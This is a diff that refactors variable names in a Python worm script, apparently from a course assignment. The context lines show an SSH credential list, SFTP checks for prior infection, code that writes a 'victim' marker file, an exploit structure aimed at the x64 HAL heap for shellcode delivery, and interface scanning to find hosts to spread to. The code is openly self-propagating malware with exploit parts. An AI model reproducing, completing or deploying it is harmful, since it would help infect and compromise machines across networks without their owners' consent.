@@ -64,11 +64,9 @@ credList = [
 # The file marking whether the worm has spread
 #########################################################################################################################################
 
-INFECTED_MARKER_FILE = "/tmp/infected.txt"
-WORM_FILE = "/tmp/worm.py"
-LOOPBACK_INTERFACE = "lo"
-WORM_MSG =  "BEWARE! YOU HAVE BEEN A VICTIM OF OPERATION BLUE KITTY"
-
+infectedMarkerFile = "/tmp/infected.txt"
+loopbackInterface = "lo"
+wormMsg=  "BEWARE! YOU HAVE BEEN A VICTIM OF OPERATION BLUE KITTY"
 sc = ""
 numGroomConn = 0
 
@@ -129,7 +127,7 @@ def isInfectedSystem( sftpClient ):
 	# you created when you marked the system
 	# as infected).
 	try:
-		sftpClient.stat( INFECTED_MARKER_FILE )									# Check if remote host is infected
+		sftpClient.stat( infectedMarkerFile )									# Check if remote host is infected
 		return True
 	except IOError:
 		return False
@@ -141,10 +139,10 @@ def markInfected( ):
 	# Mark the system as infected. One way to do
 	# this is to create a file called infected.txt
 	# in directory /tmp/
-	# sftpClient.put( "/tmp/infected.txt", INFECTED_MARKER_FILE )
+	# sftpClient.put( "/tmp/infected.txt", infectedMarkerFile )
 
-	infected_tag = open( INFECTED_MARKER_FILE, "w" )
-	infected_tag.write( WORM_MSG )
+	infected_tag = open( infectedMarkerFile, "w" )
+	infected_tag.write( wormMsg )
 	infected_tag.close()
 
 ###############################################################
@@ -718,8 +716,8 @@ fake_recv_struct += pack('<QQ', 0, TARGET_HAL_HEAP_ADDR_x64+0x1f0-1)  # x64 shel
 if len( sys.argv ) >= 1:
 	# If we are running on the victim, check if the victim was already infected. If so, terminate.
 	# Otherwise, proceed with malice.
-	if os.path.exists( INFECTED_MARKER_FILE ):
-		print "\n" + INFECTED_MARKER_FILE + " file already exists. Please remove it to run " + sys.argv[0]
+	if os.path.exists( infectedMarkerFile ):
+		print "\n" + infectedMarkerFile + " file already exists. Please remove it to run " + sys.argv[0]
 		sys.exit()
 
 	# Mark Infected and Proceed with proceed with distributing worm
@@ -731,7 +729,7 @@ if len( sys.argv ) >= 1:
 		print tagging_error
 
 interface_list = netifaces.interfaces()
-interface_list.remove( LOOPBACK_INTERFACE )
+interface_list.remove( loopbackInterface )
 
 # Code to run scans and detect hosts on available interfaces
 for interface in interface_list:
